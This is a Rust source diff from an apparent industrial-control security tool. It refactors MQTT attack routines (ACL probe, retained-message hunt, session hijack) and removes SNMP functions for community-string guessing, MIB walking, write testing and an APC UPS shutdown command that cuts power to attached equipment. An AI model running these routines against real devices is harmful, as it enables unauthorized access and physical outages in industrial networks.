+            let pub_ok = session
+                .publish(&variant, b"scadaver/acl-probe", 0, false)
+                .is_ok();
             let pl = if pub_ok { "PUB:YES" } else { "PUB:NO " };
             let _ = tx.send(ScanEvent::MqttLine(format!("[{sl:<12} {pl}]  {variant}")));
         }
         let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
-        let _ = tx.send(ScanEvent::MqttLine(format!(" {} variant(s) tested.", tested.len())));
+        let _ = tx.send(ScanEvent::MqttLine(format!(
+            " {} variant(s) tested.",
+            tested.len()
+        )));
         let _ = tx.send(ScanEvent::MqttDone("ACL Probe".into()));
     });
 }
 
 fn run_tui_retain(app: &mut App) {
-    let Some(arc) = app.mqtt_session.as_ref() else { return };
+    let Some(arc) = app.mqtt_session.as_ref() else {
+        return;
+    };
     let arc = Arc::clone(arc);
     let tx = app.scan_tx.clone();
 
@@ -8172,7 +5950,9 @@ fn run_tui_retain(app: &mut App) {
     app.mqtt_attack_label = "Retain Hunt".into();
 
     std::thread::spawn(move || {
-        let mut session = arc.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        let mut session = arc
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
         if session.subscribe("#", 0).is_err() {
             let _ = tx.send(ScanEvent::MqttLine(" Retain Hunt".into()));
             let _ = tx.send(ScanEvent::MqttLine("─".repeat(60)));
@@ -8200,7 +5980,11 @@ fn run_tui_retain(app: &mut App) {
                 if sensitive {
                     sensitive_count += 1;
                 }
-                let flag = if sensitive { "[SENSITIVE]" } else { "[         ]" };
+                let flag = if sensitive {
+                    "[SENSITIVE]"
+                } else {
+                    "[         ]"
+                };
                 let _ = tx.send(ScanEvent::MqttLine(format!(
                     "{flag}  {} : {}  [{fmt}]",
                     msg.topic, display
@@ -8219,7 +6003,8 @@ fn run_tui_retain(app: &mut App) {
 
 fn run_tui_session_hijack(app: &mut App, clientid: &str) {
     if app.mqtt_attack_running {
-        app.mqtt_attack_lines.push("[*] Attack already running\u{2026}".into());
+        app.mqtt_attack_lines
+            .push("[*] Attack already running\u{2026}".into());
         return;
     }
     let (host, port) = match app.mqtt_broker.rsplit_once(':') {
@@ -8230,8 +6015,16 @@ fn run_tui_session_hijack(app: &mut App, clientid: &str) {
         None => return,
     };
     let clientid = clientid.to_string();
-    let username = if app.mqtt_username.is_empty() { None } else { Some(app.mqtt_username.clone()) };
-    let password = if app.mqtt_password.is_empty() { None } else { Some(app.mqtt_password.clone()) };
+    let username = if app.mqtt_username.is_empty() {
+        None
+    } else {
+        Some(app.mqtt_username.clone())
+    };
+    let password = if app.mqtt_password.is_empty() {
+        None
+    } else {
+        Some(app.mqtt_password.clone())
+    };
     let tx = app.scan_tx.clone();
 
     app.mqtt_attack_running = true;
@@ -8241,7 +6034,9 @@ fn run_tui_session_hijack(app: &mut App, clientid: &str) {
 
     std::thread::spawn(move || {
         let sep = "─".repeat(60);
-        let _ = tx.send(ScanEvent::MqttLine(format!(" Session Hijack: clientid={clientid}")));
+        let _ = tx.send(ScanEvent::MqttLine(format!(
+            " Session Hijack: clientid={clientid}"
+        )));
         let _ = tx.send(ScanEvent::MqttLine(sep.clone()));
 
         let opts = ConnectOptions {
@@ -8265,7 +6060,9 @@ fn run_tui_session_hijack(app: &mut App, clientid: &str) {
                 } else {
                     "NO (fresh session / victim wiped)"
                 };
-                let _ = tx.send(ScanEvent::MqttLine(format!("[+] Connected. Session present: {state}")));
+                let _ = tx.send(ScanEvent::MqttLine(format!(
+                    "[+] Connected. Session present: {state}"
+                )));
                 s
             }
             Err(e) => {
@@ -8305,253 +6102,14 @@ fn run_tui_session_hijack(app: &mut App, clientid: &str) {
     });
 }
 
-// ─── Helpers ─────────────────────────────────────────────────────────────────
-
-fn hex_fmt(b: &[u8]) -> String {
-    use std::fmt::Write;
-    b.iter().fold(String::new(), |mut s, x| {
-        let _ = write!(s, "{x:02x}");
-        s
-    })
-}
-
-// ─── SNMP exploits ────────────────────────────────────────────────────────────
-
-fn exploit_snmp_sys_info(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP system info from {ip}:{p}..."));
-    let community_owned;
-    let community = if input.trim().is_empty() {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response on any common community — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    } else {
-        input.trim()
-    };
-    let scalar = [oids::SYS_DESCR, oids::SYS_OBJECT_ID, oids::SYS_UPTIME,
-                  oids::SYS_CONTACT, oids::SYS_NAME, oids::SYS_LOCATION];
-    let labels = ["sysDescr", "sysOID", "Uptime", "Contact", "Name", "Location"];
-    match client::get_multi(ip, p, community, &scalar) {
-        Ok(results) => {
-            out(&format!("  community = {community}"));
-            for (i, (_, val)) in results.iter().enumerate() {
-                out(&format!("  {:<10} = {}", labels[i], val.display()));
-            }
-            out("[+] System info retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_interfaces(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP interface table from {ip}:{p}..."));
-    let community_owned;
-    let community = if input.trim().is_empty() {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    } else {
-        input.trim()
-    };
-    match enumerate::get_interfaces(ip, p, community) {
-        Ok(ifaces) if ifaces.is_empty() => out("[!] No interface entries returned"),
-        Ok(ifaces) => {
-            for i in &ifaces {
-                let state = if i.oper_up { "up" } else { "DOWN" };
-                out(&format!("  [{:>2}] {:<16} {} {:<5}  {}Mbps  err in:{} out:{}",
-                    i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors));
-            }
-            out(&format!("[+] {} interface(s)", ifaces.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_topology(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP network topology from {ip}:{p}..."));
-    let community_owned;
-    let community = if input.trim().is_empty() {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    } else {
-        input.trim()
-    };
-    match enumerate::get_topology(ip, p, community) {
-        Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
-        Ok(lines) => {
-            for l in &lines { out(l); }
-            out("[+] Topology data retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP community scan on {ip}:{p}..."));
-    let mut found = 0u32;
-    for &c in oids::COMMON_COMMUNITIES {
-        if let Ok(val) = client::get(ip, p, c, oids::SYS_DESCR) {
-            out(&format!("  [+] community={c:<12}  sysDescr={}", val.display()));
-            found += 1;
-        }
-    }
-    if found == 0 {
-        out("[-] No community strings responded");
-    } else {
-        out(&format!("[+] {found} community string(s) found"));
-    }
-}
-
-fn exploit_snmp_cve_probe(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, enumerate};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
-    let community_owned;
-    let community = if input.trim().is_empty() {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    } else {
-        input.trim()
-    };
-    match enumerate::get_system_info(ip, p, community) {
-        Ok(info) => {
-            out(&format!("  sysDescr = {}", info.descr));
-            out(&format!("  sysOID   = {}", info.object_id));
-            let hits = enumerate::check_cves(&info);
-            if hits.is_empty() {
-                out("[*] No known CVE patterns matched");
-            } else {
-                for h in &hits {
-                    out(&format!("  [{}] CVSS:{} {}", h.id, h.cvss, h.summary));
-                    out(&format!("         ref: {}", h.ref_url));
-                }
-                out(&format!("[!] {} advisory match(es)", hits.len()));
-            }
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::client;
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let (root, user_community) = match input.trim().rsplit_once(' ') {
-        Some((oid, comm)) if !comm.trim().is_empty() => (oid.trim(), Some(comm.trim())),
-        _ => {
-            let raw = input.trim();
-            (if raw.is_empty() { "1.3.6.1.2.1.1" } else { raw }, None)
-        }
-    };
-    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
-    let community_owned;
-    let community = if let Some(c) = user_community {
-        c
-    } else {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    };
-    match client::walk(ip, p, community, root) {
-        Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
-        Ok(entries) => {
-            for (o, v) in &entries { out(&format!("  {o} = {}", v.display())); }
-            out(&format!("[+] {} object(s)", entries.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let community = if input.trim().is_empty() { "private" } else { input.trim() };
-    out(&format!("[*] SNMP write test on {ip}:{p} with community='{community}'..."));
-    // Read current sysName, then SET it back to the same value (no-op write)
-    match client::get(ip, p, "public", oids::SYS_NAME) {
-        Ok(current) => {
-            let name_str = current.display();
-            out(&format!("  current sysName = {name_str}"));
-            let val = client::SnmpValue::OctetString(name_str.into_bytes());
-            match client::set(ip, p, community, oids::SYS_NAME, &val) {
-                Ok(_) => out("[+] Write confirmed: community string has write access"),
-                Err(e) => out(&format!("[-] Write rejected: {e}")),
-            }
-        }
-        Err(e) => out(&format!("[-] Could not read sysName: {e}")),
-    }
-}
-
-fn exploit_snmp_apc_status(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    out(&format!("[*] APC UPS status from {ip}:{p}..."));
-    let community_owned;
-    let community = if input.trim().is_empty() {
-        let Some(c) = client::discover_community(ip, p) else {
-            out("[-] No SNMP response — try supplying the community string manually");
-            return;
-        };
-        community_owned = c;
-        community_owned.as_str()
-    } else {
-        input.trim()
-    };
-    let apc_oids = [oids::APC_MODEL, oids::APC_FIRMWARE, oids::APC_SERIAL,
-                    oids::APC_BATTERY_STATUS, oids::APC_RUNTIME_MINS,
-                    oids::APC_INPUT_VOLTAGE, oids::APC_OUTPUT_LOAD_PCT, oids::APC_OUTPUT_STATUS];
-    let labels = ["Model", "Firmware", "Serial", "Battery", "Runtime(min)", "InputV", "Load%", "OutStatus"];
-    match client::get_multi(ip, p, community, &apc_oids) {
-        Ok(results) => {
-            for (i, (_, val)) in results.iter().enumerate() {
-                out(&format!("  {:<14} = {}", labels[i], val.display()));
-            }
-            let bat = results.get(3).and_then(|(_, v)| v.as_int()).unwrap_or(0);
-            if bat != 2 { out("[!] Battery status is NOT normal (2=normal)"); }
-            out("[+] APC status retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_snmp_apc_shutdown(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::snmp::{client, oids};
-    let p = if port == 0 { client::SNMP_PORT } else { port };
-    let community = if input.trim().is_empty() { "private" } else { input.trim() };
-    out(&format!("[!] APC graceful shutdown on {ip}:{p} with community='{community}'"));
-    out("[!] This will cut power to attached equipment after the UPS delay.");
-    match client::set(ip, p, community, oids::APC_CMD_GRACEFUL_OFF, &client::SnmpValue::Integer(2)) {
-        Ok(_) => out("[+] Graceful shutdown command accepted: equipment will lose power"),
-        Err(e) => out(&format!("[-] Command rejected: {e}")),
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::ops::{
+        modbus_map_chunks, parse_modbus_map_input, parse_slmp_map_input, slmp_map_chunks,
+        ModbusMapRange, ModbusTable, SlmpDeviceKind, SlmpMapRange, MODBUS_ADDRESS_SPACE,
+        SLMP_ADDRESS_SPACE,
+    };
 
     #[test]
     fn parse_target_scan_accepts_ip_only() {
@@ -8843,6 +6401,9 @@ mod tests {
             pending_tag_write: None,
             per_device_output: std::collections::HashMap::new(),
             current_output_ip: String::new(),
+            output_filter: String::new(),
+            output_filter_active: false,
+            output_has_tag_content: false,
         }
     }
 
@@ -9042,10 +6603,7 @@ mod tests {
         assert_eq!(phoenix.action_port("phoenix", 5), 0);
         assert_eq!(phoenix.action_port("phoenix", 6), 0);
 
-        let snmp = app_with_device(
-            "snmp",
-            serde_json::json!({"snmp_port": 162}),
-        );
+        let snmp = app_with_device("snmp", serde_json::json!({"snmp_port": 162}));
         assert_eq!(snmp.action_port("snmp", 0), 162);
 
         let snmp_default = app_with_device("snmp", serde_json::json!({}));
@@ -9054,4 +6612,61 @@ mod tests {
             casket::vendors::snmp::client::SNMP_PORT,
         );
     }
+
+    #[test]
+    fn compute_sweep_prefix_slash24_returns_correct_network() {
+        use std::net::Ipv4Addr;
+        let ip = Ipv4Addr::new(192, 168, 10, 45);
+        let mask = Ipv4Addr::new(255, 255, 255, 0);
+        let (net, host_bits) = compute_sweep_prefix(ip, mask);
+        assert_eq!(net, Ipv4Addr::new(192, 168, 10, 0));
+        assert_eq!(host_bits, 8);
+    }
+
+    #[test]
+    fn compute_sweep_prefix_slash16_returns_16_host_bits() {
+        use std::net::Ipv4Addr;
+        let ip = Ipv4Addr::new(10, 20, 30, 5);
+        let mask = Ipv4Addr::new(255, 255, 0, 0);
+        let (net, host_bits) = compute_sweep_prefix(ip, mask);
+        assert_eq!(net, Ipv4Addr::new(10, 20, 0, 0));
+        assert_eq!(host_bits, 16);
+    }
+
+    fn open_temp_db_for_tui_test() -> Database {
+        use std::io::Write;
+        let id = std::thread::current().id();
+        let path = std::env::temp_dir().join(format!("scadaver_tui_test_{id:?}.sqlite"));
+        let db = Database::open(&path).unwrap();
+        // register path for cleanup (best-effort)
+        if let Ok(mut f) = std::fs::File::create(path.with_extension("rm")) {
+            let _ = f.write_all(path.to_str().unwrap_or("").as_bytes());
+        }
+        db
+    }
+
+    #[test]
+    fn tui_renders_initial_frame_without_panic() {
+        use ratatui::{backend::TestBackend, Terminal};
+        let db = open_temp_db_for_tui_test();
+        let backend = TestBackend::new(120, 40);
+        let mut terminal = Terminal::new(backend).unwrap();
+        let mut app = App::new(&db);
+        terminal.draw(|f| app.draw(f)).unwrap();
+        let buf = terminal.backend().buffer().clone();
+        let has_content = buf.content().iter().any(|c| c.symbol() != " ");
+        assert!(has_content, "TUI frame should contain rendered content");
+    }
+
+    #[test]
+    fn tui_empty_device_list_renders_without_panic() {
+        use ratatui::{backend::TestBackend, Terminal};
+        let db = open_temp_db_for_tui_test();
+        let backend = TestBackend::new(80, 24);
+        let mut terminal = Terminal::new(backend).unwrap();
+        let mut app = App::new(&db);
+        terminal.draw(|f| app.draw(f)).unwrap();
+        // No assertion — just verify no panic on empty state.
+    }
+
 }
